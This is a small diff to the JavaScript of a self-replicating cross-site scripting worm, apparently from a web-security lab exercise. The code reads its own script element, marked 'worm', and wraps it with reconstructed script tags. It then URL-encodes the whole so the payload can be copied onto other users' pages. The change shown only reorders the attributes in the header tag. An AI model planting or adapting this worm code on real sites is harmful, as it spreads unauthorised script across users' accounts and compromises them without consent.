@@ -1,6 +1,6 @@
 <script type="text/javascript">
   window.onload = function () {
-    var headerTag = "<script type=\"text/javascript\" id=\"worm\">";
+    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
     var jscodeTag = document.getElementById("worm").innerHTML;
     var footerTag = "</" + "script>";
     var wormCode = encodeURIComponent(headerTag + jscodeTag + footerTag);
